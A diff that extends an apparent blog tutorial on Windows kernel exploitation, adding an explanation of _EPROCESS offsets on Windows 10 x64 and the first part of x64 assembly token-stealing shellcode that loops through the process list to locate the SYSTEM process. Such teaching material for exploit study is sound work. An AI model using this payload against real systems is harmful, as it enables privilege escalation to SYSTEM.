@@ -164,4 +164,26 @@ Let's take a look at the data type of `ActivePorcessLinks`, `_LIST_ENTRY`
 
 This data type is a doubly linked list. This means that each element in the linked list not only points to the next element, but it also points to the previous one. Essentially, the elements point in each direction. This linked list is responsible for keeping track of all active processes.
 
-There are two elements of `_EPROCESS` we need to keep track of. On Windows 10 x64, located at an offset of 0x2e0, `UniqueProcessId`
+There are two elements of `_EPROCESS` we need to keep track of. On Windows 10 x64, located at an offset of 0x2e0, `UniqueProcessId`. `ActiveProcessLinks` also needs to be kept track of, which is located at an offset 0x2e8.
+
+So essentially what we can do in x64 assembly, is locate the current process. From there, we can iterate and loop through the `_EPROCESS` structure's `ActiveLinkProcess` element. After reading in the current `ActiveProcessLinks` element, we can compare the current `UniqueProcessId` (PID) to the constant 4, which is the PID of the SYSTEM process. Let's continue our already started assembly program.
+
+```nasm
+; Windows 10 x64 Token Stealing Payload
+; Author Connor McGarr
+
+[BITS 64]
+
+_start:
+	mov rax, [gs:0x188]		; Current thread (KTHREAD)
+	mov rax, [rax + 0xb8]	   	; Current process (EPROCESS)
+  	mov rbx, rax			; Copy current process to rbx
+	
+__loop:
+	mov rbx, [rbx + 0x2e8] 		; ActiveProcessLinks
+	sub rbx, 0x2e8		   	; Go back to current process
+	mov rcx, [rbx + 0x2e0] 		; UniqueProcessId (PID)
+	cmp rcx, 4 			; Compare PID to SYSTEM PID 
+	jnz __loop			; Loop until SYSTEM PID is found
+```
+```
